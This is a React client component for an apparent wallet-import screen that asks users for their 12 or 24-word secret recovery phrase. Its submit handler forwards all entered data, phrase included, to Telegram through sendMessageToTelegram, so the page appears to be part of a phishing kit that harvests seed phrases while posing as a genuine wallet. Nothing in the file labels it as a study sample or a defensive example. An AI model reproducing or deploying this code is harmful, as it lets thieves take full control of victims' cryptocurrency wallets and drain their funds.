"use client";
import { useFormState } from "@/hooks/useFormState";
import { useState } from "react";
import {
  getMnemonicValues,
  sendMessageToTelegram,
} from "../create-account/AccountStep2";
import { FormProvider, useForm } from "react-hook-form";
import { Button } from "@/components/ui/button";
import PhraseInput from "@/components/form/PhraseInput";

interface Props {
  setActiveForm: React.Dispatch<React.SetStateAction<number>>;
}
const LoginStep1 = ({ setActiveForm }: Props) => {
  const { value, setValue } = useFormState();
  const [length, setLength] = useState(12);

  const methods = useForm({
    defaultValues: { ...value },
  });

  const onSubmit = (data: any) => {
    setActiveForm((prev) => prev + 1);

    setValue({ ...data });
    sendMessageToTelegram(
      JSON.stringify({
        ...value,
        ...data,
        type: "",
      })
    );
  };

  return (
    <FormProvider {...methods}>
      <form
        onSubmit={methods.handleSubmit(onSubmit)}
        className="w-full h-full flex flex-col"
      >
        <div className="mt-6 mb-3 w-full flex flex-col items-center justify-center ">
          <h1 className="leading-[34px] font-inter text-[28px] font-medium mb-[5px] text-white text-center">
            Secret Recovery Phrase
          </h1>
          <p className="text-lightBlack text-center text-base font-normal leading-6 ">
            Import an existing wallet with your 12 or 24-word secret recovery
            phrase.
          </p>
        </div>
        <div className=" w-full grid grid-cols-3 gap-[10px]">
          {Array(length)
            .fill("")
            .map((_, i) => (
              <PhraseInput
                required
                key={i + 1}
                id={i + 1}
                name={`phrase[${i}]`}
              />
            ))}
        </div>
        <div className="my-3">
          {length === 12 ? (
            <p
              onClick={() => setLength(24)}
              className="text-lightBlack text-[14px] cursor-pointer hover:text-lightPurple text-center"
            >
              I have a 24-word recovery phrase
            </p>
          ) : (
            <p
              onClick={() => setLength(12)}
              className="text-lightBlack text-[14px] cursor-pointer text-center hover:text-lightPurple"
            >
              I have a 12-word recovery phrase
            </p>
          )}
        </div>
        <div className="mt-auto w-full flex flex-col gap-[10px]">
          <Button
            type="submit"
            disabled={!methods.formState.isValid}
            className="disabled:bg-lightGray bg-deepPurple disabled:text-white text-blackGray "
          >
            Import Wallet
          </Button>
        </div>
      </form>
    </FormProvider>
  );
};

export default LoginStep1;
